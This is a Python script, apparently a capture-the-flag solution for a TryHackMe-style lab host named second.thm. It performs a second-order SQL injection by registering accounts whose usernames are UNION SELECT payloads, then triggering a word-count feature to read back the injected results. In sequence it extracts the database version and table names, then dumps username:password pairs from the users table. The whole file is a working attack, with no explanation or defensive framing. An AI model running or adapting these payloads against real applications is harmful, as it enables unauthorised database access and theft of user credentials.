import requests
import uuid
import re

base_url="http://second.thm:8000"

def second_sql(payload):
    ### Creating a unique uuid to avoid same email
    uid = uuid.uuid4().hex[:3]
    session = requests.session()
    email = f"murcy{uid}@murcy.com"
    password = "murcy123"


    """
    Sending the payload to register, accepting the SQL payload as username
    """

    session.post(f"{base_url}/register", data={ "username": payload, "password": password, "email": email })


    ### Login
    session.post(f"{base_url}/login", data={ "username": payload, "password": password })

    ### Get response from word count function
    response = session.post(f"{base_url}/login", data={ "text_box": "hello" })

    if response.status_code == 200:
        match = re.search(r'<p id=results>\s*(.*?)\s*</p>', response.text, re.DOTALL)
        if match:
            return match.group(1).strip()
    return f"The payload failed with status code: {response.status_code}"

if __name__=="__main__":

    print("[+] 1. Extracting MySQL / Database Version...")
    version = second_sql("' UNION SELECT 1, version(), 3, 4-- ")
    print(f"    Version: {version}\n")

    print("[+] 2. Dumping Database Tables...")
    tables = second_sql("' UNION SELECT 1, GROUP_CONCAT(table_name), 3, 4 FROM information_schema.tables WHERE table_schema=database()-- ")
    print(f"    Tables: {tables}\n")

    print("[+] 3. Dumping User Credentials...")
    # Using CONCAT_WS 
    credentials = second_sql("' UNION SELECT 1, GROUP_CONCAT(CONCAT_WS(':', username, password)), 3, 4 FROM users-- ")
    print(f"    Credentials: {credentials}\n")
